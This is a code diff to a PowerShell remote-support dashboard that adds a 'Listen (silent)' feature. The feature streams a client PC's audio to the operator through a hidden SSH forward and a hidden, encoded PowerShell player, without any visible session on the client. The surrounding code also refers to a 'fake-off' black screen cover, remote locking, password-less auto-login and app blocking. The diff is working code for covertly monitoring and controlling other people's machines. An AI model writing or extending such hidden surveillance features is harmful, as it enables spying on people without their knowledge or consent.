@@ -597,6 +597,9 @@ function Blocked-All {
 
 $script:lockedClients = @{}
 $script:workCover = @{}
+# Live-audio listen: tracks the one active audio stream (ssh -L forward process + local
+# player process). Only one client is listened to at a time.
+$script:audio = $null
 # clients under a "fake-off + restart in 5 min": keep the black cover fresh only until
 # this time, then stop (so the PC reboots clean and doesn't get re-covered after restart).
 $script:deadUntil = @{}
@@ -643,8 +646,88 @@ function Unlock-All {
     foreach ($ip in @($script:workCover.Keys)) {
         try { Stop-WorkCover $ip | Out-Null } catch {}
     }
+    try { Stop-Audio } catch {}
     $script:lockedClients.Clear()
 }
+
+# Stop the current live-audio stream: kill the ssh -L forward + the local player process.
+function Stop-Audio {
+    if ($script:audio) {
+        foreach ($k in 'fwd','player') {
+            if ($script:audio[$k]) { try { Stop-Process -Id $script:audio[$k] -Force -EA SilentlyContinue } catch {} }
+        }
+        $script:audio = $null
+    }
+}
+
+# The local audio PLAYER (runs in its own hidden powershell so it never blocks the dashboard).
+# Connects to the SSH-forwarded local port, reads the "RSAUD rate ch bits tag" header, then
+# plays the raw stream through winmm waveOut. Pure P/Invoke - no NAudio / no dependency.
+# WAVEHDR layout is read by IntPtr.Size so it is correct on 32- or 64-bit PowerShell.
+$script:playerBody = @'
+$ErrorActionPreference='SilentlyContinue'
+Add-Type @"
+using System;using System.Runtime.InteropServices;using System.Net.Sockets;using System.Text;using System.Threading;
+public class RSPlayer{
+ [StructLayout(LayoutKind.Sequential)] public struct WFX{public ushort tag;public ushort ch;public uint rate;public uint avg;public ushort block;public ushort bits;public ushort cb;}
+ [DllImport("winmm.dll")] static extern int waveOutOpen(out IntPtr h,int dev,ref WFX f,IntPtr cb,IntPtr inst,int fl);
+ [DllImport("winmm.dll")] static extern int waveOutPrepareHeader(IntPtr h,IntPtr w,int s);
+ [DllImport("winmm.dll")] static extern int waveOutUnprepareHeader(IntPtr h,IntPtr w,int s);
+ [DllImport("winmm.dll")] static extern int waveOutWrite(IntPtr h,IntPtr w,int s);
+ [DllImport("winmm.dll")] static extern int waveOutReset(IntPtr h);
+ [DllImport("winmm.dll")] static extern int waveOutClose(IntPtr h);
+ public static void Run(string host,int port){
+  TcpClient c=new TcpClient(); c.Connect(host,port); NetworkStream ns=c.GetStream();
+  StringBuilder sb=new StringBuilder(); int bch;
+  while((bch=ns.ReadByte())!=-1 && bch!=10){ sb.Append((char)bch); }
+  string[] p=sb.ToString().Trim().Split(' ');
+  int rate=int.Parse(p[1]),ch=int.Parse(p[2]),bits=int.Parse(p[3]),tag=int.Parse(p[4]);
+  WFX f=new WFX(); f.tag=(ushort)tag; f.ch=(ushort)ch; f.rate=(uint)rate; f.bits=(ushort)bits; f.block=(ushort)(ch*bits/8); f.avg=(uint)(rate*f.block); f.cb=0;
+  IntPtr h; if(waveOutOpen(out h,-1,ref f,IntPtr.Zero,IntPtr.Zero,0)!=0){ return; }
+  int ps=IntPtr.Size; int HSZ=(ps==8)?48:32; int LENOFF=(ps==8)?8:4; int FLAGOFF=(ps==8)?24:16;
+  int frames=rate/20; if(frames<256){ frames=256; } int BUF=frames*f.block; int N=12;
+  IntPtr[] ph=new IntPtr[N]; IntPtr[] pd=new IntPtr[N];
+  for(int i=0;i<N;i++){
+   pd[i]=Marshal.AllocHGlobal(BUF);
+   ph[i]=Marshal.AllocHGlobal(HSZ);
+   for(int z=0;z<HSZ;z++){ Marshal.WriteByte(ph[i],z,0); }
+   Marshal.WriteIntPtr(ph[i],0,pd[i]);
+   Marshal.WriteInt32(ph[i],LENOFF,BUF);
+   waveOutPrepareHeader(h,ph[i],HSZ);
+   int fl=Marshal.ReadInt32(ph[i],FLAGOFF); Marshal.WriteInt32(ph[i],FLAGOFF,fl|1);
+  }
+  byte[] tmp=new byte[BUF];
+  try{
+   while(true){
+    bool any=false;
+    for(int i=0;i<N;i++){
+     int fl=Marshal.ReadInt32(ph[i],FLAGOFF);
+     if((fl&1)!=0){
+      int off=0;
+      while(off<BUF){ int g=ns.Read(tmp,off,BUF-off); if(g<=0){ return; } off+=g; }
+      Marshal.Copy(tmp,0,pd[i],BUF);
+      Marshal.WriteInt32(ph[i],LENOFF,BUF);
+      waveOutWrite(h,ph[i],HSZ);
+      any=true;
+     }
+    }
+    if(!any){ Thread.Sleep(2); }
+   }
+  }catch{}
+  finally{
+   try{ waveOutReset(h); }catch{}
+   for(int i=0;i<N;i++){ try{ waveOutUnprepareHeader(h,ph[i],HSZ); }catch{} try{ Marshal.FreeHGlobal(ph[i]); }catch{} try{ Marshal.FreeHGlobal(pd[i]); }catch{} }
+   try{ waveOutClose(h); }catch{} try{ ns.Close(); }catch{} try{ c.Close(); }catch{}
+  }
+ }
+}
+"@
+$deadline=(Get-Date).AddSeconds(20)
+while((Get-Date) -lt $deadline){
+  try{ [RSPlayer]::Run($h,[int]$lp); break }
+  catch{ Start-Sleep -Milliseconds 700 }
+}
+'@
 
 function Do-Action($ip, $action) {
     switch ($action) {
@@ -702,6 +785,23 @@ Set-Content -Path 'C:\ProgramData\RemoteSupport\LOCK.flag' -Value '' -Encoding a
         'who'      { return (SSH-Run $ip 'query user') }
         'lock'     { SSH-Fire $ip 'cmd /c echo.> C:\ProgramData\RemoteSupport\LOCK.flag'; $script:lockedClients[$ip]=$true; Save-LockState; return "Lock sent - client screen is locking." }
         'unlock'   { SSH-Fire $ip 'cmd /c del /f /q C:\ProgramData\RemoteSupport\LOCK.flag'; $script:lockedClients.Remove($ip); Save-LockState; return "Unlock sent - client screen released." }
+        'listen'   {
+            # Live-listen to the client's audio with NO screen session. Audio travels inside
+            # the existing SSH connection (ssh -L forward) to a local port, where a hidden
+            # player process plays it. Only one stream at a time.
+            Stop-Audio
+            $u = Login-For $ip
+            $lp = 8711
+            # make sure nothing else is sitting on the local port
+            try { Get-NetTCPConnection -LocalPort $lp -State Listen -EA SilentlyContinue | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -EA SilentlyContinue } } catch {}
+            $fwdArgs = @('-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=6','-o','ServerAliveInterval=15','-o','ExitOnForwardFailure=yes','-N','-L',"127.0.0.1:$lp`:127.0.0.1:9988","$u@$ip")
+            $fwd = Start-Process ssh -WindowStyle Hidden -PassThru -ArgumentList $fwdArgs -EA SilentlyContinue
+            $pfx = '$lp=' + $lp + ';$h=''127.0.0.1'';' + "`n"
+            $pl = Start-Process powershell -WindowStyle Hidden -PassThru -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',(Enc ($pfx + $script:playerBody)) -EA SilentlyContinue
+            $script:audio = @{ ip = $ip; fwd = $(if($fwd){$fwd.Id}); player = $(if($pl){$pl.Id}) }
+            return "Listening to this client's audio (no screen session). Click 'Stop audio' to end. If silent, make sure something is actually playing on the client."
+        }
+        'stoplisten' { Stop-Audio; return "Audio listening stopped." }
         default    { return "Unknown action." }
     }
 }
@@ -914,6 +1014,8 @@ function panel(){
      ${btn('terminal','Terminal','')}
      ${btn('health','Health / specs','')}
      ${btn('who','Who is logged in','')}
+     ${btn('listen','&#128266; Listen (silent)','')}
+     ${btn('stoplisten','Stop audio','')}
      <button class="act" onclick="autoLogin()">Auto-login (no password)</button>
      <button class="act" onclick="appMgr()">Block apps</button>
      ${btn('restart','Restart','danger')}
